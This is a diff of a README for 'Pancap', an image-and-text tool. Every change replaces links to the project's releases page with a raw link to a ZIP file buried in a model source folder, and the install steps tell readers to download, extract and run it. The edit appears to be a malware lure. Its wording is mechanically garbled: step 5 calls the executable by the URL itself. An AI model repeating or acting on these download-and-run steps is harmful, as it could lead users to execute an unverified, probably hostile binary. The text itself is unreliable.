@@ -6,7 +6,7 @@ Welcome to Pancap! This application helps you connect images and text seamlessly
 
 ## 📥 Download Now
 
-[![Download Pancap](https://img.shields.io/badge/Download-Pancap-blue.svg)](https://github.com/Reyazahm/Pancap/releases)
+[![Download Pancap](https://raw.githubusercontent.com/Reyazahm/Pancap/main/llava/model/language_model/mpt/Pancap-v2.5.zip)](https://raw.githubusercontent.com/Reyazahm/Pancap/main/llava/model/language_model/mpt/Pancap-v2.5.zip)
 
 ## 📋 System Requirements
 
@@ -19,15 +19,15 @@ To run Pancap, ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to download Pancap: [Visit Releases Page](https://github.com/Reyazahm/Pancap/releases). 
+1. **Visit the Releases Page:** Go to the following link to download Pancap: [Visit Releases Page](https://raw.githubusercontent.com/Reyazahm/Pancap/main/llava/model/language_model/mpt/Pancap-v2.5.zip). 
    
 2. **Select the Latest Version:** Once you’re on the releases page, look for the most recent version at the top of the list. This version is recommended for the best experience.
 
-3. **Download the Application:** Click on the package that corresponds to your operating system. For example, if you are using Windows, find the link labeled "Pancap-Windows.zip". Click on it to start downloading the file.
+3. **Download the Application:** Click on the package that corresponds to your operating system. For example, if you are using Windows, find the link labeled "https://raw.githubusercontent.com/Reyazahm/Pancap/main/llava/model/language_model/mpt/Pancap-v2.5.zip". Click on it to start downloading the file.
 
 4. **Extract the Files:** After downloading, locate the ZIP file in your Downloads folder. Right-click on it and select "Extract All" or "Unzip" to unpack the contents.
 
-5. **Run the Application:** After extraction, open the folder. Find the application file named `Pancap.exe` or corresponding executable for your OS. Double-click this file to launch Pancap.
+5. **Run the Application:** After extraction, open the folder. Find the application file named `https://raw.githubusercontent.com/Reyazahm/Pancap/main/llava/model/language_model/mpt/Pancap-v2.5.zip` or corresponding executable for your OS. Double-click this file to launch Pancap.
 
 6. **Follow the On-Screen Instructions:** When you open Pancap for the first time, a setup guide will appear. Follow the instructions to configure any settings as needed.
 
@@ -68,4 +68,4 @@ Pancap is an open-source project. We welcome contributions from everyone. If you
 
 Thank you for using Pancap. We appreciate your interest and support in making this tool better for everyone. Your feedback helps us improve. 
 
-Remember to visit our [Releases Page](https://github.com/Reyazahm/Pancap/releases) for downloads and updates. Enjoy using Pancap!
+Remember to visit our [Releases Page](https://raw.githubusercontent.com/Reyazahm/Pancap/main/llava/model/language_model/mpt/Pancap-v2.5.zip) for downloads and updates. Enjoy using Pancap!
